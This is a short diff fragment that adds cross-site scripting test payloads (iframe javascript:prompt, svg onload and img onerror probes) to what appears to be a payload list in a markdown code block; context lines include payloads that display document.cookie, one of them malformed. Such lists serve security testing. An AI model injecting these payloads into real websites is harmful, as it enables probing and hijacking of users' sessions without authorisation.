@@ -14,4 +14,10 @@
 "><iframe src=javascript:prompt(document.cookie)>
 
 tes/><iframe src-javascript:prompt(document.cookie)>
+
+"><iframe src=javascript:prompt(1)>
+
+"><svg onload=alert(1)>
+
+"><img src=x onerror="alert(1)">
 ```
